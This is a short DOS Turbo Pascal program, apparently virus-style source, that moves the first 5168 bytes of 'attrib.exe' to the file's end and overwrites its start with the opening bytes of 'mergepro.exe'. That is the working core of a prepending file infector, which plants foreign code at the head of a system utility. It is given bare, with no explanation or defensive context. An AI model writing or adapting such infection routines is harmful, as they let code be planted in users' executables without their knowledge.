program merge_pro;
uses crt, dos;
var
 buffer : array[1..5168] of byte;
 source, thefile : file;
 count, rec, thesize, rec2 : integer;
begin
  assign(thefile, 'attrib.exe');
  assign(source, 'mergepro.exe');
  count := 1;
   reset(thefile, 1);
    seek(thefile, 0);
     blockread(thefile, buffer, sizeof(buffer), rec);
      repeat
        thesize := filesize(thefile);
        seek(thefile, thesize);
        blockwrite(thefile, buffer, rec);
        count := count - 1;
      until count = 0;
        reset(source, 1);
          count := 1;
           reset(source, 1);
            blockread(source, buffer, sizeof(buffer), rec2);
             repeat
               seek(thefile, 0);
               blockwrite(thefile, buffer, rec2);
               count := count - 1;
             until count = 0;
         close(thefile);
         close(source);
write('press enter...');
readln;
end.